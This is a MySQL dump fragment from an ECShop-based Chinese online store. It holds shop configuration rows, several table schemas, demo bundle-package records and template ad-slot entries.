INSERT INTO `ec22703249_shop_config` VALUES ('104', '1', 'shop_keywords', 'text', '', '', '君禾园', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('105', '1', 'shop_country', 'manual', '', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('106', '1', 'shop_province', 'manual', '', '', '22', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('107', '1', 'shop_city', 'manual', '', '', '288', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('108', '1', 'shop_address', 'text', '', '', '详细地址888号', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('109', '1', 'qq', 'text', '', '', '896581586', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('110', '1', 'ww', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('111', '1', 'skype', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('112', '1', 'ym', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('113', '1', 'msn', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('114', '1', 'service_email', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('115', '1', 'service_phone', 'text', '', '', '010-12345678', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('116', '1', 'shop_closed', 'select', '0,1', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('117', '1', 'close_comment', 'textarea', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('118', '1', 'shop_logo', 'file', '', '../themes/{$template}/images/', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('119', '1', 'licensed', 'select', '0,1', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('120', '1', 'user_notice', 'textarea', '', '', '用户中心公告！', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('121', '1', 'shop_notice', 'textarea', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('122', '1', 'shop_reg_closed', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('201', '2', 'lang', 'manual', '', '', 'zh_cn', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('202', '2', 'icp_number', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('203', '2', 'icp_file', 'file', '', '../cert/', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('204', '2', 'watermark', 'file', '', '../images/', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('205', '2', 'watermark_place', 'select', '0,1,2,3,4,5', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('206', '2', 'watermark_alpha', 'text', '', '', '65', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('207', '2', 'use_storage', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('208', '2', 'market_price_rate', 'text', '', '', '1.2', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('209', '2', 'rewrite', 'select', '0,1,2', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('210', '2', 'integral_name', 'text', '', '', '积分', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('211', '2', 'integral_scale', 'text', '', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('212', '2', 'integral_percent', 'text', '', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('213', '2', 'sn_prefix', 'text', '', '', 'ECS', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('214', '2', 'comment_check', 'select', '0,1', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('215', '2', 'no_picture', 'file', '', '../images/', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('218', '2', 'stats_code', 'textarea', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('219', '2', 'cache_time', 'text', '', '', '3600', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('220', '2', 'register_points', 'text', '', '', '888', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('221', '2', 'enable_gzip', 'select', '0,1', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('222', '2', 'top10_time', 'select', '0,1,2,3,4', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('223', '2', 'timezone', 'options', '-12,-11,-10,-9,-8,-7,-6,-5,-4,-3.5,-3,-2,-1,0,1,2,3,3.5,4,4.5,5,5.5,5.75,6,6.5,7,8,9,9.5,10,11,12', '', '8', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('224', '2', 'upload_size_limit', 'options', '-1,0,64,128,256,512,1024,2048,4096', '', '64', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('226', '2', 'cron_method', 'select', '0,1', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('227', '2', 'comment_factor', 'select', '0,1,2,3', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('228', '2', 'enable_order_check', 'select', '0,1', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('229', '2', 'default_storage', 'text', '', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('230', '2', 'bgcolor', 'text', '', '', '#FFFFFF', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('231', '2', 'visit_stats', 'select', 'on,off', '', 'off', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('232', '2', 'send_mail_on', 'select', 'on,off', '', 'off', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('233', '2', 'auto_generate_gallery', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('234', '2', 'retain_original_img', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('235', '2', 'member_email_validate', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('236', '2', 'message_board', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('239', '2', 'certificate_id', 'hidden', '', '', '1300952936', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('240', '2', 'token', 'hidden', '', '', '6b0bef3bc6a1f52e7bcbd6e7ac639b5ac3e95d393d915ca69a7137964841ee6a', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('241', '2', 'certi', 'hidden', '', '', 'http://service.shopex.cn/openapi/api.php', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('242', '2', 'send_verify_email', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('243', '2', 'ent_id', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('244', '2', 'ent_ac', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('245', '2', 'ent_sign', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('246', '2', 'ent_email', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('301', '3', 'date_format', 'hidden', '', '', 'Y-m-d', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('302', '3', 'time_format', 'text', '', '', 'Y-m-d H:i:s', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('303', '3', 'currency_format', 'text', '', '', '￥%s元', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('304', '3', 'thumb_width', 'text', '', '', '180', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('305', '3', 'thumb_height', 'text', '', '', '180', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('306', '3', 'image_width', 'text', '', '', '600', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('307', '3', 'image_height', 'text', '', '', '600', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('312', '3', 'top_number', 'text', '', '', '10', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('313', '3', 'history_number', 'text', '', '', '5', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('314', '3', 'comments_number', 'text', '', '', '5', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('315', '3', 'bought_goods', 'text', '', '', '3', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('316', '3', 'article_number', 'text', '', '', '8', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('317', '3', 'goods_name_length', 'text', '', '', '15', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('318', '3', 'price_format', 'select', '0,1,2,3,4,5', '', '5', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('319', '3', 'page_size', 'text', '', '', '10', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('320', '3', 'sort_order_type', 'select', '0,1,2', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('321', '3', 'sort_order_method', 'select', '0,1', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('322', '3', 'show_order_type', 'select', '0,1,2', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('323', '3', 'attr_related_number', 'text', '', '', '5', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('324', '3', 'goods_gallery_number', 'text', '', '', '5', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('325', '3', 'article_title_length', 'text', '', '', '16', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('326', '3', 'name_of_region_1', 'text', '', '', '国家', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('327', '3', 'name_of_region_2', 'text', '', '', '省', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('328', '3', 'name_of_region_3', 'text', '', '', '市', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('329', '3', 'name_of_region_4', 'text', '', '', '区', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('330', '3', 'search_keywords', 'text', '', '', '小米手机3,小米电视,变形金刚,百变后盖,优惠套装', '0');
INSERT INTO `ec22703249_shop_config` VALUES ('332', '3', 'related_goods_number', 'text', '', '', '4', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('333', '3', 'help_open', 'select', '0,1', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('334', '3', 'article_page_size', 'text', '', '', '10', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('335', '3', 'page_style', 'select', '0,1', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('336', '3', 'recommend_order', 'select', '0,1', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('337', '3', 'index_ad', 'hidden', '', '', 'sys', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('401', '4', 'can_invoice', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('402', '4', 'use_integral', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('403', '4', 'use_bonus', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('404', '4', 'use_surplus', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('405', '4', 'use_how_oos', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('406', '4', 'send_confirm_email', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('407', '4', 'send_ship_email', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('408', '4', 'send_cancel_email', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('409', '4', 'send_invalid_email', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('410', '4', 'order_pay_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('411', '4', 'order_unpay_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('412', '4', 'order_ship_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('413', '4', 'order_receive_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('414', '4', 'order_unship_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('415', '4', 'order_return_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('416', '4', 'order_invalid_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('417', '4', 'order_cancel_note', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('418', '4', 'invoice_content', 'textarea', '', '', '测试发票\r\n网络服务\r\n送领导的', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('419', '4', 'anonymous_buy', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('420', '4', 'min_goods_amount', 'text', '', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('421', '4', 'one_step_buy', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('422', '4', 'invoice_type', 'manual', '', '', 'a:2:{s:4:\"type\";a:3:{i:0;s:1:\"1\";i:1;s:1:\"2\";i:2;s:0:\"\";}s:4:\"rate\";a:3:{i:0;d:1;i:1;d:1.5;i:2;d:0;}}', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('423', '4', 'stock_dec_time', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('424', '4', 'cart_confirm', 'options', '1,2,3,4', '', '3', '0');
INSERT INTO `ec22703249_shop_config` VALUES ('425', '4', 'send_service_email', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('426', '4', 'show_goods_in_cart', 'select', '1,2,3', '', '3', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('427', '4', 'show_attr_in_cart', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('501', '5', 'smtp_host', 'text', '', '', 'localhost', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('502', '5', 'smtp_port', 'text', '', '', '25', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('503', '5', 'smtp_user', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('504', '5', 'smtp_pass', 'password', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('505', '5', 'smtp_mail', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('506', '5', 'mail_charset', 'select', 'UTF8,GB2312,BIG5', '', 'UTF8', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('507', '5', 'mail_service', 'select', '0,1', '', '0', '0');
INSERT INTO `ec22703249_shop_config` VALUES ('508', '5', 'smtp_ssl', 'select', '0,1', '', '0', '0');
INSERT INTO `ec22703249_shop_config` VALUES ('601', '6', 'integrate_code', 'hidden', '', '', 'ecshop', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('602', '6', 'integrate_config', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('603', '6', 'hash_code', 'hidden', '', '', 'd44426bd5b64dd2ce05e88473bb59429', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('604', '6', 'template', 'hidden', '', '', 'xm2013', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('605', '6', 'install_date', 'hidden', '', '', '1380510900', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('606', '6', 'ec22703249_version', 'hidden', '', '', 'v2.7.3', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('607', '6', 'sms_user_name', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('608', '6', 'sms_password', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('609', '6', 'sms_auth_str', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('610', '6', 'sms_domain', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('611', '6', 'sms_count', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('612', '6', 'sms_total_money', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('613', '6', 'sms_balance', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('614', '6', 'sms_last_request', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('616', '6', 'affiliate', 'hidden', '', '', 'a:3:{s:6:\"config\";a:7:{s:6:\"expire\";d:24;s:11:\"expire_unit\";s:4:\"hour\";s:11:\"separate_by\";i:0;s:15:\"level_point_all\";s:2:\"5%\";s:15:\"level_money_all\";s:2:\"1%\";s:18:\"level_register_all\";i:2;s:17:\"level_register_up\";i:60;}s:4:\"item\";a:4:{i:0;a:2:{s:11:\"level_point\";s:3:\"60%\";s:11:\"level_money\";s:3:\"60%\";}i:1;a:2:{s:11:\"level_point\";s:3:\"30%\";s:11:\"level_money\";s:3:\"30%\";}i:2;a:2:{s:11:\"level_point\";s:2:\"7%\";s:11:\"level_money\";s:2:\"7%\";}i:3;a:2:{s:11:\"level_point\";s:2:\"3%\";s:11:\"level_money\";s:2:\"3%\";}}s:2:\"on\";i:1;}', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('617', '6', 'captcha', 'hidden', '', '', '36', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('618', '6', 'captcha_width', 'hidden', '', '', '100', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('619', '6', 'captcha_height', 'hidden', '', '', '20', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('620', '6', 'sitemap', 'hidden', '', '', 'a:6:{s:19:\"homepage_changefreq\";s:6:\"hourly\";s:17:\"homepage_priority\";s:3:\"0.9\";s:19:\"category_changefreq\";s:6:\"hourly\";s:17:\"category_priority\";s:3:\"0.8\";s:18:\"content_changefreq\";s:6:\"weekly\";s:16:\"content_priority\";s:3:\"0.7\";}', '0');
INSERT INTO `ec22703249_shop_config` VALUES ('621', '6', 'points_rule', 'hidden', '', '', '', '0');
INSERT INTO `ec22703249_shop_config` VALUES ('622', '6', 'flash_theme', 'hidden', '', '', 'dynfocus', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('623', '6', 'stylename', 'hidden', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('701', '7', 'show_goodssn', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('702', '7', 'show_brand', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('703', '7', 'show_goodsweight', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('704', '7', 'show_goodsnumber', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('705', '7', 'show_addtime', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('706', '7', 'goodsattr_style', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('707', '7', 'show_marketprice', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('801', '8', 'sms_shop_mobile', 'text', '', '', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('802', '8', 'sms_order_placed', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('803', '8', 'sms_order_payed', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('804', '8', 'sms_order_shipped', 'select', '1,0', '', '0', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('901', '9', 'wap_config', 'select', '1,0', '', '1', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('902', '9', 'wap_logo', 'file', '', '../images/', '', '1');
INSERT INTO `ec22703249_shop_config` VALUES ('903', '2', 'message_check', 'select', '1,0', '', '1', '1');

-- ----------------------------
-- Table structure for `ec22703249_snatch_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_snatch_log`;
CREATE TABLE `ec22703249_snatch_log` (
  `log_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `snatch_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `bid_price` decimal(10,2) NOT NULL DEFAULT '0.00',
  `bid_time` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`log_id`),
  KEY `snatch_id` (`snatch_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_snatch_log
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_stats`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_stats`;
CREATE TABLE `ec22703249_stats` (
  `access_time` int(10) unsigned NOT NULL DEFAULT '0',
  `ip_address` varchar(15) NOT NULL DEFAULT '',
  `visit_times` smallint(5) unsigned NOT NULL DEFAULT '1',
  `browser` varchar(60) NOT NULL DEFAULT '',
  `system` varchar(20) NOT NULL DEFAULT '',
  `language` varchar(20) NOT NULL DEFAULT '',
  `area` varchar(30) NOT NULL DEFAULT '',
  `referer_domain` varchar(100) NOT NULL DEFAULT '',
  `referer_path` varchar(200) NOT NULL DEFAULT '',
  `access_url` varchar(255) NOT NULL DEFAULT '',
  KEY `access_time` (`access_time`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_stats
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_suppliers`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_suppliers`;
CREATE TABLE `ec22703249_suppliers` (
  `suppliers_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `suppliers_name` varchar(255) DEFAULT NULL,
  `suppliers_desc` mediumtext,
  `is_check` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`suppliers_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_suppliers
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_system_taocan`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_system_taocan`;
CREATE TABLE `ec22703249_system_taocan` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `tname` varchar(255) DEFAULT NULL COMMENT '套餐名',
  `tprice` decimal(10,2) DEFAULT '0.00' COMMENT '套餐价格',
  `tpic` varchar(255) DEFAULT NULL COMMENT '套餐图片',
  `last_date` varchar(255) DEFAULT NULL COMMENT '最后修改时间',
  `descs` text COMMENT '描述',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_system_taocan
-- ----------------------------
INSERT INTO `ec22703249_system_taocan` VALUES ('4', 'hello 套餐测试', '100.00', 'images/201408/1408086592235181418.jpg', '1408086592', 'werewrwer');
INSERT INTO `ec22703249_system_taocan` VALUES ('5', '套餐BB', '268.00', 'images/201408/1408238723738588577.jpg', '1408238723', '呵呵的。');
INSERT INTO `ec22703249_system_taocan` VALUES ('6', '套餐CCC', '10000.00', 'images/201408/1408238765630380415.jpg', '1408238765', '这是套餐CCC点。');
INSERT INTO `ec22703249_system_taocan` VALUES ('7', '套餐DDD', '228.00', 'images/201408/1408238816189784286.jpg', '1408238816', '套餐DDD');
INSERT INTO `ec22703249_system_taocan` VALUES ('8', '套餐EEE', '1998.00', 'images/201408/1408238853259753676.jpg', '1408238853', '套餐EEE');

-- ----------------------------
-- Table structure for `ec22703249_system_tc_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_system_tc_goods`;
CREATE TABLE `ec22703249_system_tc_goods` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `tcid` int(10) DEFAULT NULL COMMENT '套餐ID',
  `gids` varchar(255) DEFAULT NULL COMMENT '商品ID',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=30 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_system_tc_goods
-- ----------------------------
INSERT INTO `ec22703249_system_tc_goods` VALUES ('3', '4', 'a:2:{i:0;s:1:\"1\";i:1;s:1:\"2\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('4', '4', 'a:2:{i:0;s:1:\"3\";i:1;s:1:\"4\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('11', '8', 'a:2:{i:0;s:1:\"7\";i:1;s:1:\"8\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('20', '9', 'a:2:{i:0;s:1:\"1\";i:1;s:1:\"2\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('21', '9', 'a:3:{i:0;s:1:\"6\";i:1;s:1:\"9\";i:2;s:2:\"21\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('22', '9', 'a:2:{i:0;s:1:\"9\";i:1;s:2:\"10\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('23', '1', 'a:2:{i:0;s:1:\"1\";i:1;s:1:\"2\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('24', '1', 'a:2:{i:0;s:1:\"1\";i:1;s:1:\"2\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('25', '5', 'a:2:{i:0;s:1:\"4\";i:1;s:1:\"5\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('26', '6', 'a:2:{i:0;s:2:\"22\";i:1;s:2:\"23\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('27', '6', 'a:3:{i:0;s:1:\"3\";i:1;s:2:\"22\";i:2;s:2:\"23\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('28', '7', 'a:2:{i:0;s:1:\"3\";i:1;s:1:\"4\";}');
INSERT INTO `ec22703249_system_tc_goods` VALUES ('29', '8', 'a:2:{i:0;s:2:\"10\";i:1;s:2:\"11\";}');

-- ----------------------------
-- Table structure for `ec22703249_tag`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_tag`;
CREATE TABLE `ec22703249_tag` (
  `tag_id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tag_words` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`tag_id`),
  KEY `user_id` (`user_id`),
  KEY `goods_id` (`goods_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_tag
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_taocan_job`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_taocan_job`;
CREATE TABLE `ec22703249_taocan_job` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `jname` varchar(255) DEFAULT NULL,
  `status` varchar(1) DEFAULT NULL COMMENT '1:正在运行 2:暂停中',
  `last_date` varchar(255) DEFAULT NULL,
  `weeks` int(10) DEFAULT '1' COMMENT '一年中第几周',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_taocan_job
-- ----------------------------
INSERT INTO `ec22703249_taocan_job` VALUES ('1', '自动生成订单', '1', '2313123123', '33');

-- ----------------------------
-- Table structure for `ec22703249_template`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_template`;
CREATE TABLE `ec22703249_template` (
  `filename` varchar(30) NOT NULL DEFAULT '',
  `region` varchar(40) NOT NULL DEFAULT '',
  `library` varchar(40) NOT NULL DEFAULT '',
  `sort_order` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `number` tinyint(1) unsigned NOT NULL DEFAULT '5',
  `type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `theme` varchar(60) NOT NULL DEFAULT '',
  `remarks` varchar(30) NOT NULL DEFAULT '',
  KEY `filename` (`filename`,`region`),
  KEY `theme` (`theme`),
  KEY `remarks` (`remarks`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_template
-- ----------------------------
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热评商品文字说明', '/library/ad_position.lbi', '0', '25', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热评商品广告', '/library/ad_position.lbi', '0', '24', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告10', '/library/ad_position.lbi', '0', '23', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告9', '/library/ad_position.lbi', '0', '22', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告8', '/library/ad_position.lbi', '0', '21', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告7', '/library/ad_position.lbi', '0', '20', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告6', '/library/ad_position.lbi', '0', '19', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告5', '/library/ad_position.lbi', '0', '18', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告4', '/library/ad_position.lbi', '0', '17', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告3', '/library/ad_position.lbi', '0', '16', '1', '4', 'xm2013', '');
INSERT INTO `ec22703249_template` VALUES ('index', '广告-首页热卖商品广告2', '/library/ad_position.lbi', '0', '15', '1', '4', 'xm2013', '');
